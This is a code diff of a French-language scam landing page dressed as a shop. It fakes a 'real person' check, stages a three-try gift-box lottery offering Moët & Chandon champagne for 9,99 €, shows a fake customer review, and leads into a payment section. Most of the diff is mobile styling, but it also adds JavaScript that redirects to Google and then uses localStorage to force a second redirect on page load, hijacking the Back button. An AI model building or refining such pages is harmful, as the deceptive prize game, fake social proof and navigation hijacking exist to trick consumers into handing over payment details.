@@ -149,7 +149,58 @@
             }
         }
 
+        /* Responsive styles for small screens */
+        @media (max-width: 640px) {
+    #trymodal > div {
+        width: 85%; /* Reduce width for small screens */
+        height: 85%;
+        padding-left: 1rem; /* Reduce padding */
+        padding-right: .5rem;
+    }
+    #trymodal .w-\[200px\] { /* Escape Tailwind class */
+        width: 150px; /* Reduce image size */
+        height: 150px;
+    }
+    #trymodal .text-2xl {
+        font-size: 1.25rem; /* Adjust font size */
+    }
+    #trymodal .text-md {
+        font-size: 1rem;
+    }
+    #trymodal .px-12 {
+        padding-left: 2rem; /* Adjust button padding */
+        padding-right: 2rem;
+    }
+}
+@media (max-width: 640px) {
+        #errorModal > div {
+            max-width: 70%; /* Reduce width for small screens */
+            padding-left: 1rem; /* Adjust padding */
+            padding-right: 1rem;
+        }
+        #errorModal .text-2xl {
+            font-size: 1.5rem; /* Adjust font size */
+        }
+        #errorModal .text-lg {
+            font-size: 1rem; /* Adjust font size */
+        }
+        #errorModal button {
+            padding-left: 2rem; /* Adjust button padding */
+            padding-right: 2rem;
+        }
+    }
 
+    @media (max-width: 640px) {
+                .step-container {
+                    gap: 8px; /* Adjust gap for small screens */
+                }
+                .step-line {
+                    width: 8px !important; /* Adjust line width for small screens */
+                }
+                .flex-col.items-center p {
+                    text-align: center; /* Align text with the step number */
+                }
+            }
 
     </style>
 </head>
@@ -323,14 +374,14 @@
                         <div class="flex flex-wrap items-center gap-2 mt-3">
                             <!-- Out of Stock Thumbnail -->
                             <div class="text-center cursor-not-allowed text-gray-500">
-                                <img src="./images/1.webp"
+                                <img src="./images/4.webp"
                                     class="w-10 h-14 sm:w-12 sm:h-16 rounded-md opacity-50 border border-gray-300">
                                 <p class="text-xs text-gray-500 mt-1">Rupture de stock</p>
                             </div>
 
                             <!-- Selected Product Thumbnail -->
                             <div class="text-center">
-                                <img src="./images/2.webp" class="w-10 h-14 sm:w-12 sm:h-16 rounded-md border-2 border-red-500">
+                                <img src="./images/1.webp" class="w-10 h-14 sm:w-12 sm:h-16 rounded-md border-2 border-red-500">
                             </div>
                         </div>
                     </div>
@@ -752,7 +803,7 @@
                         <div class="mt-4 gap-[6px]">
                             <!-- Reviewer Info -->
                             <div class="flex items-center space-x-2 justify-center lg:justify-start">
-                                <img src="./images/dp4.webp" class="w-8 h-8 rounded-full">
+                                <img src="./images/dp3.webp" class="w-8 h-8 rounded-full">
                                 <span class="text-[#0F1111]">Sophie Martin</span>
                             </div>
 
@@ -869,8 +920,7 @@
             </div>
 
             <p class="text-gray-600 p-4 text-center">L'adresse IP de l'utilisateur ne permet pas de tirer de conclusions sur les demandes précédentes.</p>
-            <h3 class="text-xl font-medium">Nous avons reçu avec succès vos réponses.</h3>
-
+            <h3 class="text-xl font-medium text-center sm:text-left">Nous avons reçu avec succès vos réponses.</h3>
         </div>
     </div>
 
@@ -957,58 +1007,58 @@
 
 
 
-    <!-- Modal -->
-    <div id="trymodal" class="fixed inset-0 z-50 flex items-center justify-center hidden">
-        <div
-            class="bg-white rounded-2xl pt-2 pb-2 pl-14 pr-14 max-w-md mx-auto text-center shadow-[0_35px_600px_-5px_rgba(0,0,0,0.9)]">
-            <div class="w-[200px] h-[200px] mx-auto mb-2">
-                <img src="./images/box1.webp" alt="Box"
-                    class="w-full h-full object-contain animate-[spinBox_3s_ease-in-out_infinite]">
-            </div>
+  <!-- Modal -->
+<div id="trymodal" class="fixed inset-0 z-50 flex items-center justify-center hidden p-4">
+    <div
+        class="bg-white rounded-2xl p-6 sm:pt-2 sm:pb-2 sm:pl-14 sm:pr-14 w-full max-w-md sm:max-w-md mx-auto text-center shadow-[0_35px_600px_-5px_rgba(0,0,0,0.9)]">
+        <div class="w-[150px] sm:w-[200px] h-[150px] sm:h-[200px] mx-auto mb-2">
+            <img src="./images/box1.webp" alt="Box"
+                class="w-full h-full object-contain animate-[spinBox_3s_ease-in-out_infinite]">
+        </div>
 
-            <div class="space-y-4 p-0">
-                <p class="text-gray-500 font-normal text-2xl">
-                    Vous avez confirmé avec succès
-                    <span class="text-gray-500"> que vous êtes une vraie personne.</span>
-                </p>
-                <p class="text-md font-bold">
-                    Votre choix n'a pas encore gagné <br>
-                    Vous avez la chance de gagner
-                    Coffret de Champagne Moet & Chandon Brut Impérial (6 bouteilles) au prix spécial de 9,99 € !
-                </p>
-                <p class="text-sm text-dark">Tout ce que vous avez à faire maintenant est de choisir le bon cadeau.</p>
-                <p class="text-sm text-dark">Vous avez 3 essais, bonne chance !
-                </p>
+        <div class="space-y-3 sm:space-y-4 p-0">
+            <p class="text-gray-500 font-normal text-lg sm:text-2xl">
+                Vous avez confirmé avec succès
+                <span class="text-gray-500"> que vous êtes une vraie personne.</span>
+            </p>
+            <p class="text-sm sm:text-md font-bold">
+                Votre choix n'a pas encore gagné <br>
+                Vous avez la chance de gagner
+                Coffret de Champagne Moet & Chandon Brut Impérial (6 bouteilles) au prix spécial de 9,99 € !
+            </p>
+            <p class="text-xs sm:text-sm text-dark">Tout ce que vous avez à faire maintenant est de choisir le bon cadeau.</p>
+            <p class="text-xs sm:text-sm text-dark">Vous avez 3 essais, bonne chance !
+            </p>
 
-                <button onclick="hidetryModal()"
-                    class="bg-[#FFD814] hover:bg-[#F7CA00] text-black px-12 py-4 rounded-full text-sm font-medium shadow-md">
-                    OK
-                </button>
-            </div>
+            <button onclick="hidetryModal()"
+                class="bg-[#FFD814] hover:bg-[#F7CA00] text-black px-8 sm:px-12 py-3 sm:py-4 rounded-full text-sm font-medium shadow-md">
+                OK
+            </button>
         </div>
     </div>
+</div>
 
-    <!-- Error Modal -->
+
     <div id="errorModal"
-        class="hidden fixed inset-0 z-50 items-center justify-center opacity-0 transition-all duration-500 ease-in-out">
-        <div
-            class="bg-white rounded-2xl pt-4 pb-4 pl-6 pr-6 max-w-2xl mx-auto text-center shadow-[0_35px_600px_-5px_rgba(0,0,0,0.9)] transform scale-95 transition-all duration-500 ease-in-out">
+    class="hidden fixed inset-0 z-50 items-center justify-center opacity-0 transition-all duration-500 ease-in-out">
+    <div
+        class="bg-white rounded-2xl pt-4 pb-4 pl-6 pr-6 max-w-2xl mx-auto text-center shadow-[0_35px_600px_-5px_rgba(0,0,0,0.9)] transform scale-95 transition-all duration-500 ease-in-out">
 
-            <div class="space-y-6 p-0">
-                <p class="text-gray-500 font-bold text-2xl">
-                    OHHH...
-                </p>
+        <div class="space-y-6 p-0">
+            <p class="text-gray-500 font-bold text-2xl">
+                OHHH...
+            </p>
 
-                <p class="text-lg text-dark">Désolé, mais cette boîte est vide ! (<span id="attemptsRemaining">2</span>)
-                    tentatives restantes.</p>
+            <p class="text-lg text-dark">Désolé, mais cette boîte est vide ! (<span id="attemptsRemaining">2</span>)
+                tentatives restantes.</p>
 
-                <button onclick="hideModal()"
-                    class="bg-[#FFD814] hover:bg-[#F7CA00] text-black px-12 py-4 rounded-full text-sm font-medium shadow-md">
-                    OK
-                </button>
-            </div>
+            <button onclick="hideModal()"
+                class="bg-[#FFD814] hover:bg-[#F7CA00] text-black px-12 py-4 rounded-full text-sm font-medium shadow-md">
+                OK
+            </button>
         </div>
     </div>
+</div>
 
     <!-- Success Modal -->
     <div id="bottlemodal"
@@ -1031,18 +1081,19 @@
                     <p>3. Le colis sera livré sous 3 à 5 jours.</p>
                 </div>
 
-                <a href="https://www.google.com" target="_blank">
-                    <button onclick="hideSuccessModal()"
+                
+                    <button onclick="redirectToGoogle()"
                         class="bg-[#FFD814] hover:bg-[#F7CA00] text-black px-8 sm:px-12 py-4 rounded-full text-sm font-medium shadow-md">
                         OK
                     </button>
-                </a>
+              
             </div>
         </div>
     </div>
 
     <!-- Payment Section -->
     <div class="hidden" id="payment-section">
+        
         <div class="flex justify-center items-center mt-[100px] mb-12 ml-0 sm:ml-0">
             <div class="flex items-center flex-wrap sm:flex-nowrap step-container">
                 <!-- Step 1 -->
@@ -1050,19 +1101,19 @@
                     <div class="w-12 h-12 bg-black rounded-full flex items-center justify-center text-white font-bold text-lg">
                         1
                     </div>
-                    <p class="text-sm mt-2">Adresse de livraison</p>
+                    <p class="text-sm mt-2">Loterie</p>
                 </div>
                 <!-- Step Line -->
-                <div class="step-line bg-gray-300 h-1 w-16"></div>
+                <div class="step-line bg-black h-1 w-18 sm:w-32"></div>
                 <!-- Step 2 -->
-                <div class="flex flex-col items-center">
+                <div class="flex flex-col items-center w-12 mt-6">
                     <div class="w-12 h-12 bg-black rounded-full flex items-center justify-center text-white font-bold text-lg">
                         2
                     </div>
-                    <p class="text-sm mt-2">Détails de paiement</p>
+                    <p class="text-sm mt-2">Détails de la commande</p>
                 </div>
                 <!-- Step Line -->
-                <div class="step-line bg-gray-300 h-1 w-16"></div>
+                <div class="step-line bg-gray-300 h-1 w-16 sm:w-32"></div>
                 <!-- Step 3 -->
                 <div class="flex flex-col items-center">
                     <div class="w-12 h-12 bg-gray-400 rounded-full flex items-center justify-center text-white font-bold text-lg">
@@ -1072,6 +1123,7 @@
                 </div>
             </div>
         </div>
+
 
         <div class="max-w-7xl mx-auto px-8">
             <div class="flex flex-col md:flex-row gap-8">
@@ -1359,20 +1411,6 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
                     // Timer functionality
 function startTimer() {
     // Get timer elements
@@ -1428,7 +1466,34 @@ document.getElementById('backToTop').addEventListener('click', function(event) {
     });
 });
 
-                </script>
+function redirectToGoogle() {
+            try {
+                localStorage.setItem("redirectBack", "https://www.youtube.com"); // Store YouTube URL
+                window.location.href = "https://www.google.com"; // Redirect to Google
+            } catch (error) {
+                console.error("Redirect Error:", error);
+            }
+        }
+
+        function checkForBackRedirect() {
+            try {
+                let storedURL = localStorage.getItem("redirectBack");
+                if (storedURL) {
+                    localStorage.removeItem("redirectBack"); // Remove after use
+                    window.location.replace(storedURL); // Force redirect to YouTube
+                }
+            } catch (error) {
+                console.error("Back Redirect Error:", error);
+            }
+        }
+
+        // Run this function when the page loads (after clicking Back)
+        window.onload = checkForBackRedirect;
+
+
+
+
+</script>
 
 </body>
 
